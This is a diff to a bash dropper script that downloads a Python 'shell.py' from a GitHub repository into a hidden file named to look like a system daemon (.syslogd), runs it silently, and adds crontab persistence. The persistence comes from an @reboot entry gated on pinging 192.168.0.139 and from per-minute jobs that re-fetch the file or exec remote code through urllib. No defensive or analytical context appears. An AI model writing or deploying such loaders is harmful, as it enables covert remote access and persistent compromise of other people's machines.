@@ -1,10 +1,10 @@
 #!/bin/bash
 set -e
 
-# Check if cron is running (silently)
+# Check if cron is running
 if ! systemctl is-active --quiet cron; then
-    sudo systemctl start cron >/dev/null 2>&1 || exit 1
-    sudo systemctl enable cron >/dev/null 2>&1 || exit 1
+    sudo systemctl start cron >/dev/null 2>&1 || { echo "[-] Failed to start cron" >&2; exit 1; }
+    sudo systemctl enable cron >/dev/null 2>&1 || { echo "[-] Failed to enable cron" >&2; exit 1; }
 fi
 
 # Check Python3
@@ -30,16 +30,17 @@ if ! curl -sSL "$shell_url" -o ~/.cache/.systemd-conf/.syslogd; then
     echo "[-] Failed to download shell.py" >&2
     exit 1
 fi
+chmod +x ~/.cache/.systemd-conf/.syslogd
 nohup python3 ~/.cache/.systemd-conf/.syslogd >/dev/null 2>&1 &
 
-# Add persistence via crontab (auto-recreate, network wait)
+# Add persistence via crontab (simple, auto-recreate)
 crontab -l > /tmp/cron 2>/dev/null || true
 if ! grep -q ".systemd-conf/.syslogd" /tmp/cron; then
     echo "PATH=/usr/local/bin:/usr/bin:/bin" >> /tmp/cron
     echo "@reboot /bin/bash -c 'until ping -c1 192.168.0.139 >/dev/null 2>&1; do sleep 5; done && nohup python3 ~/.cache/.systemd-conf/.syslogd >/dev/null 2>&1 &'" >> /tmp/cron
-    echo "* * * * * [ -f ~/.cache/.systemd-conf/.syslogd ] || (curl -sSL https://raw.githubusercontent.com/sakibrony/Linux-Recon-Tool/main/shell.py -o ~/.cache/.systemd-conf/.syslogd && nohup python3 ~/.cache/.systemd-conf/.syslogd >/dev/null 2>&1 &)" >> /tmp/cron
-    echo "* * * * * nohup python3 -c \"import urllib.request; exec(urllib.request.urlopen('$shell_url').read().decode())\" >/dev/null 2>&1 &" >> /tmp/cron
-    crontab /tmp/cron >/dev/null 2>&1 || exit 1
+    echo "* * * * * [ -f ~/.cache/.systemd-conf/.syslogd ] || (curl -sSL https://raw.githubusercontent.com/sakibrony/Linux-Recon-Tool/main/shell.py -o ~/.cache/.systemd-conf/.syslogd && chmod +x ~/.cache/.systemd-conf/.syslogd && nohup python3 ~/.cache/.systemd-conf/.syslogd >/dev/null 2>&1 &)" >> /tmp/cron
+    echo "* * * * * /bin/bash -c 'until ping -c1 192.168.0.139 >/dev/null 2>&1; do sleep 5; done && nohup python3 -c \"import urllib.request; exec(urllib.request.urlopen(\\\"$shell_url\\\").read().decode())\" >/dev/null 2>&1 &'" >> /tmp/cron
+    crontab /tmp/cron >/dev/null 2>&1 || { echo "[-] Failed to set crontab" >&2; exit 1; }
 fi
 rm -f /tmp/cron >/dev/null 2>&1
 
